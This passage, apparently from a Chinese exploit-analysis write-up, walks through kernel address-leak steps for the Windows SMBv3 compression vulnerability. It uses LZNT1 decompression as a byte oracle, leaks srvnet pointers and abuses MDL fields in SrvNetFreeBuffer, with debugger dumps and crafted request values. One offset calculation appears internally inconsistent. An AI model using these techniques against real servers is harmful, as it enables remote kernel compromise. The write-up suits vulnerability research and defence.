    ffffa508`35a9423d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`35a9424d  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff     ...............
控制后续的请求包占用之前布置好的0x4100缓冲区，设置Offset使其指向待泄露的那个字节，利用LZTN1解压算法从高位到低位逐个泄露字节。主要是利用LZTN1解压算法特性以及SMB2协商，在SMB2协商过程中使用LZTN1压缩，对SMB2
SESSION SETUP请求数据进行压缩。构造如下请求，如果LZNT1测试数据解压成功，就代表要泄露的数据不小于0的个数减3，并且由于解压成功，SMB2
SESSION SETUP数据成功被复制。如果解压失败，SMB2 SESSION
SETUP数据不会被复制，连接断开。根据连接是否还在调整0的个数，如果连接断开，就增大0的个数，否则减小0的个数，直到找到临界值，泄露出那个字节。
### 泄露srvnet基址
SRVNET_BUFFER_HDR第一项为ConnectionBufferList.Flink指针（其指向SRVNET_RECV偏移0x58处的ConnectionBufferList.Flink），SRVNET_RECV偏移0x100处存放了AcceptSocket指针。AcceptSocket偏移0x30处为srvnet!SrvNetWskConnDispatch函数指针。可通过泄露这个指针，然后减去已有偏移得到srvnet模块的基址。
    //SRVNET_BUFFER_HDR
    kd> dd rax
    ffffa508`31221150  2f566798 ffffa508 2f566798 ffffa508
    ffffa508`31221160  00030002 00000000 31219050 ffffa508
    ffffa508`31221170  00008100 00008100 000082e8 ffffffff
    ffffa508`31221180  31219000 ffffa508 312211e0 ffffa508
    ffffa508`31221190  00000000 ffffffff 00008100 00000000
    ffffa508`312211a0  31221260 ffffa508 31221150 ffffa508
    //SRVNET_RECV->AcceptSocket
    kd> dq ffffa5082f566798 - 58 + 100
    ffffa508`2f566840  ffffa508`36143c28 00000000`00000000
    ffffa508`2f566850  00000000`00000000 ffffa508`3479cd18
    ffffa508`2f566860  ffffa508`2f4a6dc0 ffffa508`34ae4170
    ffffa508`2f566870  ffffa508`35f56040 ffffa508`34f19520
    //srvnet!SrvNetWskConnDispatch
    kd> u poi(ffffa508`36143c28+30)
    srvnet!SrvNetWskConnDispatch:
    fffff802`57d3d170 50              push    rax
    fffff802`57d3d171 5a              pop     rdx
    fffff802`57d3d172 d15702          rcl     dword ptr [rdi+2],1
    fffff802`57d3d175 f8              clc
    fffff802`57d3d176 ff              ???
    fffff802`57d3d177 ff00            inc     dword ptr [rax]
    fffff802`57d3d179 6e              outs    dx,byte ptr [rsi]
    fffff802`57d3d17a d15702          rcl     dword ptr [rdi+2],1
**泄露ConnectionBufferList.Flink指针**
首先要泄露ConnectionBufferList.Flink指针，以便泄露AcceptSocket指针以及srvnet!SrvNetWskConnDispatch函数指针。在这里使用了另一种思路：使用正常压缩的数据[:-6]覆盖ConnectionBufferList.Flink指针之前数据，这样在解压的时候正好可以带出这6个字节，要注意请求数据长度与Offset+0x10的差值，这个差值应该大于压缩数据+6的长度。在这个过程中需要保持一个正常连接，使得泄露出的ConnectionBufferList所在的SRVNET_RECV结构是有效的。如下所示，解压后的数据长度正好为0x2b，其中，后6位为ConnectionBufferList的低6个字节。
    kd> g
    request: ffffa508`31219050  424d53fc 0000002b 00000001 000080e3
    srv2!Srv2DecompressData+0x26:
    fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h
    kd> db ffffa508`31219050+80e3+10 l20   //待解压数据
    ffffa508`31221143  10 b0 40 41 42 43 44 45-46 1b 50 58 00 18 3a 80  ..@ABCDEF.PX..:.
    ffffa508`31221153  34 08 a5 ff ff 18 3a 80-34 08 a5 ff ff 02 00 03  4.....:.4.......
    kd> g
    srv2!Srv2DecompressData+0xdc:
    fffff802`51ce7f3c e86f650406      call    srvnet!SmbCompressionDecompress (fffff802`57d2e4b0)
    kd> db r9 l30   //解压前缓冲区
    ffffa508`31ac1133  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1143  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1153  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    kd> p
    srv2!Srv2DecompressData+0xe1:
    fffff802`51ce7f41 85c0            test    eax,eax
    kd> db ffffa508`31ac1133 l30   //解压后缓冲区
    ffffa508`31ac1133  41 42 43 44 45 46 41 42-43 44 45 46 41 42 43 44  ABCDEFABCDEFABCD
    ffffa508`31ac1143  45 46 41 42 43 44 45 46-41 42 43 44 45 46 41 42  EFABCDEFABCDEFAB
    ffffa508`31ac1153  43 44 45 46 58 18 3a 80-34 08 a5 ff ff ff ff ff  CDEFX.:.4.......
然后向目标缓冲区偏移0x810e处解压覆盖测试数据 b0 00 00 ...
，之前解压出的0x2b大小的数据放在了偏移0x80e3处，如果要从最后一位开始覆盖，那解压缩的偏移就是0x810e+0x2b（即0x810e）。
    kd> g
    request: ffffa508`31edb050  424d53fc 00007ff2 00000001 0000810e
    srv2!Srv2DecompressData+0x26:
    fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h
    //解压前
    kd> db rdx   //rdx指向待解压数据
    ffffa508`31ee316e  07 b0 14 b0 00 7e 00 ff-7c 00 ff ff ff ff ff ff  .....~..|.......
    ffffa508`31ee317e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ee318e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ee319e  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ee31ae  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ee31be  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ee31ce  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ee31de  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    kd> db r9-6 l30   //r9指向目标缓冲区
    ffffa508`31ac1158  18 3a 80 34 08 a5 ff ff-ff ff ff ff ff ff ff ff  .:.4............
    ffffa508`31ac1168  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1178  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    //解压后
    kd> db ffffa508`31ac1158 l30
    ffffa508`31ac1158  18 3a 80 34 08 a5 b0 00-00 00 00 00 00 00 00 00  .:.4............
    ffffa508`31ac1168  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac1178  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
然后采用和之前一样的方式泄露该地址低6个字节。根据连接是否断开调整00的长度，直到找到满足临界点的值，从而泄露出ConnectionBufferList。
    kd> g
    request: ffffa508`31ab9050  424d53fc 00008004 00000001 000080fd
    srv2!Srv2DecompressData+0x26:
    fffff802`51ce7e86 83782410        cmp     dword ptr [rax+24h],10h
    kd> db rdx-6 l100
    ffffa508`31ac1157  58 18 3a 80 34 08 a5 b0-00 00 00 00 00 00 00 00  X.:.4...........
    ffffa508`31ac1167  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac1177  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac1187  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac1197  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11a7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11b7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11c7  00 00 00 00 00 00 00 00-00 00 00 00 00 00 00 00  ................
    ffffa508`31ac11d7  00 00 00 00 00 00 00 00-00 00 ff ff ff ff ff ff  ................
    ffffa508`31ac11e7  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac11f7  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1207  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1217  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1227  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1237  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
    ffffa508`31ac1247  ff ff ff ff ff ff ff ff-ff ff ff ff ff ff ff ff  ................
后面就是继续获取AcceptSocket指针以及srvnet!SrvNetWskConnDispatch函数指针。SrvNetFreeBuffer函数中存在如下代码（有省略），可帮助我们将某地址处的值复制到一个可控的地址。当BufferFlags为3时，pMdl1指向MDL中的MappedSystemVa会变成之前的值加0x50，pMdl2指向的MDL中的StartVa被赋值为pMdl1->MappedSystemVa
+ 0x50的高52位，pMdl2指向的MDL中的ByteOffset被赋值为pMdl1->MappedSystemVa +
0x50的低12位。也就是说pMdl2的StartVa和ByteOffset中会分开存放原先pMdl1中的MappedSystemVa的值加0x50的数据。
    void SrvNetFreeBuffer(PSRVNET_BUFFER_HDR Buffer)
    {
        PMDL pMdl1 = Buffer->pMdl1;
        PMDL pMdl2 = Buffer->pMdl2;
        if (Buffer->BufferFlags & 0x02) {
            if (Buffer->BufferFlags & 0x01) {
                pMdl1->MappedSystemVa = (BYTE*)pMdl1->MappedSystemVa + 0x50；
                pMdl2->StartVa = (PVOID)((ULONG_PTR)pMdl1->MappedSystemVa & ~0xFFF)；
                pMdl2->ByteOffset = pMdl1->MappedSystemVa & 0xFFF
            }
            Buffer->BufferFlags = 0;
            // ...
            pMdl1->Next = NULL;
            pMdl2->Next = NULL;
            // Return the buffer to the lookaside list.
        } else {
            SrvNetUpdateMemStatistics(NonPagedPoolNx, Buffer->PoolAllocationSize, FALSE);
            ExFreePoolWithTag(Buffer->PoolAllocationPtr, '00SL');
        }
    }
可利用上述流程，将指定地址处的数据再加0x50的值复制到pMdl2指向的结构中，然后再利用之前的方法逐字节泄露。思路是通过覆盖两个pmdl指针，覆盖pmdl1指针为AcceptSocket指针减0x18，这和MDL结构相关，如下所示，其偏移0x18处为MappedSystemVa指针，这样可使得AcceptSocket地址正好存放在pMdl1->MappedSystemVa。然后覆盖pmdl2指针为一个可控的内存，POC中为之前泄露的0x2100内存的指针加0x1250偏移处。这样上述代码执行后，就会将AcceptSocket地址的信息存放在pmdl2指向的MDL结构（已知地址）中。
    kd> dt _mdl
    win32k!_MDL
       +0x000 Next             : Ptr64 _MDL
       +0x008 Size             : Int2B
       +0x00a MdlFlags         : Int2B
       +0x00c AllocationProcessorNumber : Uint2B
       +0x00e Reserved         : Uint2B
       +0x010 Process          : Ptr64 _EPROCESS
       +0x018 MappedSystemVa   : Ptr64 Void
       +0x020 StartVa          : Ptr64 Void
       +0x028 ByteCount        : Uint4B
       +0x02c ByteOffset       : Uint4B
    kd> ?ffffa50834803a18-58+100-18
    Evaluate expression: -100020317570392 = ffffa508`34803aa8
    kd> ?ffffa50836240000+1250  //这个和no transport header相关
    Evaluate expression: -100020290055600 = ffffa508`36241250
    //覆盖前
    kd> dd ffffa508`31ab9050+10138
    ffffa508`31ac9188  31ac91e0 ffffa508 00000000 00000000
    ffffa508`31ac9198  00000000 00000000 31ac92a0 ffffa508
    ffffa508`31ac91a8  00000000 00000000 00000000 00000000
    //覆盖后